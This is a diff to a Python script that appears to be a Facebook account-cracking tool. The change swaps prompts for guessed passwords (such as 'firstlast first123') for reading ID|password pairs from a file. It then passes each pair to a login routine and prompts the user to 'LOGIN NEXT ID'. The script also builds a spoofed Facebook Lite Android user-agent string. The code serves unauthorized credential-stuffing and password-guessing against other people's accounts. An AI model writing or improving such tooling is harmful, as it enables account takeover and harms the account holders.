@@ -90,33 +90,19 @@ def __Hasan__():
     os.system('clear')
     logo()
 
-    # Ask for file path once
     dfile = input(f'\x1b[38;5;86m[/] EXAMPLE \033[1;91m[sdcard/mahadi.txt]\n\x1b[38;5;87m[\] ENTER FILE PATH : ')
     try:
         dx = open(dfile, 'r').read().splitlines()
     except FileNotFoundError:
         print(f'{rad}[×] FILE NOT FOUND...')
         time.sleep(1)
-        return  # Exit if file is missing
+        return
 
     if not dx:
         print(f'{rad}[×] FILE IS EMPTY...')
         time.sleep(1)
         return
 
-    # Ask for password list once
-    os.system('clear')
-    logo()
-    try:
-        pass_lmit = int(input('\x1b[38;5;154m[/] ENTER PASSWORD LIMIT : '))
-    except:
-        pass_lmit = 1
-
-    dplist = []
-    for i in range(pass_lmit):
-        dplist.append(input(f'\x1b[38;5;155m[\] EXAMPLE \033[1;91m[firstlast first123 ETC]\n\x1b[38;5;156m[/] PASSWORD NO.{i+1} : '))
-
-    # Start looping through one ID at a time
     for user in dx:
         os.system('clear')
         logo()
@@ -125,15 +111,18 @@ def __Hasan__():
         linex()
 
         try:
-            ids, names = user.split('|')
+            ids, pas = user.split('|')
+            ids = ids.strip()
+            pas = pas.strip()
         except:
-            continue  # Skip malformed lines
+            continue  # skip bad lines
 
-        __Fire__(ids, names, dplist)
+        __Fire__(ids, "", [pas])  # pass password as list with one item
 
         print(f"{green}[{rad}+{green}] PROCESS COMPLETE.")
         linex()
-        input("PRESS ENTER TO LOGIN NEXT ID...")  # Wait for user
+        input("PRESS ENTER TO LOGIN NEXT ID...")
+
 
 def __MAHADI___():
     bal1=f'Dalvik/2.1.0 (Linux; U; Android 7; Oppo J793V Build/NRB0YP) [FBAN/EMA;FBAV/183.0.0.61.23;FBBV/595127737;FBRV/0;FBPN/com.facebook.lite;FBLC/en_US;FBMF/OPPO;FBBD/OPPO;FBDV/Oppo J793V;FBSV/7;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+'FB_FW/1;]'
